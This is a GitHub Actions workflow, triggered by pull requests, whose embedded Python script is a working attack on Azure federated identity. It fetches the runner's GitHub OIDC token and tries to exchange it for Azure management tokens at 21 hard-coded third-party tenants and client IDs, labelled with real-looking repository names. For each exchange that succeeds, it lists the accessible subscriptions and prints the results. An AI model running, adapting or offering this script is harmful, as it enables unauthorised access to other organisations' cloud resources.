name: c211-i79672-pr
on:
  pull_request:
    branches: [ main ]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  exch:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: exchange
        run: |
          python3 - <<'PYEOF'
          import os, json, base64, subprocess, urllib.parse, urllib.request, urllib.error, time
          def jl(b):
              try: return json.loads(b)
              except Exception: return {}
          def oidc(aud):
              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
              t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
              if not u or not t: return ''
              u=u+'&audience='+urllib.parse.quote(aud,safe='')
              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
              return jl(out).get('value','')
          def post_form(url, data):
              body=urllib.parse.urlencode(data).encode()
              req=urllib.request.Request(url, data=body, method='POST', headers={'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json','User-Agent':'c211-i79672'})
              try:
                  r=urllib.request.urlopen(req, timeout=45); return r.status, r.read().decode('utf-8','replace')
              except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1, repr(e)[:300]
          def get(url, tok):
              req=urllib.request.Request(url, headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'c211-i79672'})
              try:
                  r=urllib.request.urlopen(req, timeout=45); return r.status, r.read().decode('utf-8','replace')
              except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1, repr(e)[:300]
          tok=oidc('api://AzureADTokenExchange')
          sub=None; claims={}
          if tok:
              p=tok.split('.')[1]; p+='='*(-len(p)%4)
              try:
                  claims=jl(base64.urlsafe_b64decode(p)); sub=claims.get('sub')
              except Exception: pass
          print('RESULT '+json.dumps({'kind':'subject','sub':sub,'aud':claims.get('aud'),'iss':claims.get('iss'),'repo':claims.get('repository'),'ref':claims.get('ref'),'event':claims.get('event_name')}), flush=True)
          if not tok:
              print('RESULT '+json.dumps({'kind':'fatal','err':'no oidc token'})); raise SystemExit(0)
          TARGETS=[{'label': 'planta7/tinta', 'tenant': '965b4876-de8a-43b7-b14d-6561c23374b3', 'client': 'b9f5a8d5-3a91-42b5-a732-b44101964561', 'subscription': None}, {'label': 'nathalie-beaudoin/share-la', 'tenant': '7264fb2a-5580-4c1e-a169-3df80f011601', 'client': 'd4f66394-2034-4bb8-aa40-7cb8d4f1c58a', 'subscription': 'c104e174-8f82-4e43-889c-d3b22b5da7b8'}, {'label': 'lockb0x-llc/nodezero-social', 'tenant': 'bab5056b-732f-4710-a7b9-e9c5807cd6f9', 'client': '52120dbe-2b66-4e12-bdad-9f872a3ae845', 'subscription': '1f002267-9614-4a2a-a0e0-217493d6d011'}, {'label': 'hmcts/cnp-java-base', 'tenant': '531ff96d-0ae9-462a-8d2d-bec7c0b42082', 'client': 'c6a3a50b-762f-4b4f-b7ec-f1d84be20cef', 'subscription': None}, {'label': 'jelledruyts/Authr', 'tenant': 'bfcb8d36-2e08-4142-908c-27eb5be24938', 'client': 'a96f7b48-548a-4083-8a8a-69440bdc0a4b', 'subscription': '6c198425-f933-458f-a8f2-951a4c981997'}, {'label': 'hmcts/darts-gateway', 'tenant': '531ff96d-0ae9-462a-8d2d-bec7c0b42082', 'client': '82f79201-9a30-4160-b264-7bbed775c7f4', 'subscription': None}, {'label': 'equinor/radix-public-site', 'tenant': '3aa4a235-b6e2-48d5-9195-7fcf05b459b0', 'client': '5b03f246-caca-45ce-98b9-a8151b08dd8f', 'subscription': None}, {'label': 'tdealer01-crypto/DSG-Cinema-Proof-Agent', 'tenant': 'cbc618d5-9aa3-46b5-ae64-d07794603a7a', 'client': 'bd54ab6e-5f92-48c8-8f8d-0c114ef938da', 'subscription': 'dcf13c0d-0d9f-4f81-aa89-c6b50aaef839'}, {'label': 'jblan2026-hub/obserra-website', 'tenant': '7d8b7b64-c80c-4c8a-a514-66f6b1cf8607', 'client': 'dc3ff3e1-ea35-4879-afa9-fa3eee49df85', 'subscription': '38d660ff-611e-4f6c-ad29-70f5cf118f52'}, {'label': 'UiPath/skills', 'tenant': 'd8353d2a-b153-4d17-8827-902c51f72357', 'client': 'ca18c791-e99c-4ccd-9c40-760e849b78a3', 'subscription': None}, {'label': 'DarrenTurchiarelli/ManagedAzPolicy', 'tenant': '2e3988ea-da07-42da-9b5f-7c3f05b3eaf7', 'client': '8a9944b7-0ecb-41e5-a08c-3837da634b47', 'subscription': None}, {'label': 'varianter/shared-workflows', 'tenant': '0f16d077-bd82-4a6c-b498-52741239205f', 'client': '5f983c3e-ce10-4d5b-87e3-115511e67890', 'subscription': None}, {'label': 'github/gh-aw', 'tenant': '398a6654-997b-47e9-b12b-9515b896b4de', 'client': 'adb907fd-188c-4029-b67f-2559d96b2f1b', 'subscription': None}, {'label': 'NVIDIA/aicr', 'tenant': '43083d15-7273-40c1-b7db-39efd9ccc17a', 'client': '047f0427-5dcf-4e7c-97c3-9c71d92c5abb', 'subscription': 'e88faa01-b4fd-49d3-b934-0ad9f9fca307'}, {'label': 'Paal-Andre/LinkedInWebhook', 'tenant': 'e7b931d0-cec1-4377-a051-e243b7561b40', 'client': '7f36c4b1-281f-4e8c-bf99-f5cd3c236ee3', 'subscription': '8f7632eb-3eca-4579-885f-187540753d20'}, {'label': 'bradhermsen/TipIn', 'tenant': '42da914a-4f59-4b27-9146-44aa32e46587', 'client': 'e8f777f6-c14d-4037-ae7e-6d9c12695ff3', 'subscription': '22eed768-4fc5-4709-93f6-c31b3205a73b'}, {'label': 'cococelgit/LSCInventoryCopartIaaI', 'tenant': 'ccfdc482-7c38-458c-b7b7-b7967a122f1d', 'client': 'e54f22e9-0a3a-42d8-b3d2-538e60872feb', 'subscription': '99edf3d1-a651-4d2d-af8e-d44a3360f584'}, {'label': 'asefameerador96-ctrl/Infini-Backup', 'tenant': 'c3fe8cd9-f644-4f76-bb09-920687b1237d', 'client': '02f4f574-35df-4a2e-9a9b-99cac22aa223', 'subscription': 'e2dde12e-087a-4db9-80cc-129d6dbec90b'}, {'label': 'martin2176org/ecs-apim-workflows', 'tenant': '21c9315b-cdc8-41c8-b30d-d4da2c5a804b', 'client': '8a742eb1-9619-4292-b2da-384f8b4c3736', 'subscription': 'db73da55-ad6a-4d59-aeea-bba62c278f2a'}, {'label': 'patelr3/sunniebudget', 'tenant': '50d3fb80-db3c-406e-bc9d-a22a6b825219', 'client': 'e8de1562-63b2-4236-9c74-d8e3bf83e61d', 'subscription': '34154ec0-9335-4f09-a67a-bda54a403a14'}, {'label': 'tinku99-dev/trbot-source', 'tenant': 'da34c113-8b4f-453a-b7d8-92b6087438fb', 'client': '9b765859-a84a-4b9f-8bc8-46539131026b', 'subscription': '5f66945a-ed88-4f91-87bd-f3074c0d752c'}]
          successes=[]
          for t in TARGETS:
              label, tenant, client, subid = t['label'], t['tenant'], t['client'], t.get('subscription')
              st, body = post_form('https://login.microsoftonline.com/%s/oauth2/v2.0/token' % tenant, {
                  'grant_type':'client_credentials','client_id': client,
                  'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
                  'client_assertion': tok,
                  'scope':'https://management.azure.com/.default'})
              j=jl(body); at=j.get('access_token','')
              rec={'kind':'exchange','label':label,'tenant':tenant,'client':client,'subscription':subid,'http':st,
                   'error':j.get('error'),'aadsts':(j.get('error_description','').split(':')[0] if j.get('error_description') else None),
                   'desc':(j.get('error_description') or '')[:220],'token_len':len(at)}
              print('RESULT '+json.dumps(rec), flush=True)
              if at:
                  successes.append({'label':label,'tenant':tenant,'client':client,'subscription':subid})
                  st2,b2=get('https://management.azure.com/subscriptions?api-version=2022-12-01', at)
                  print('RESULT '+json.dumps({'kind':'arm_subscriptions','label':label,'http':st2,'body':b2[:1500]}), flush=True)
          if successes:
              print('RESULT '+json.dumps({'kind':'successes','n':len(successes),'labels':[s['label'] for s in successes]}), flush=True)
          else:
              print('RESULT '+json.dumps({'kind':'done','n':0}), flush=True)
          PYEOF
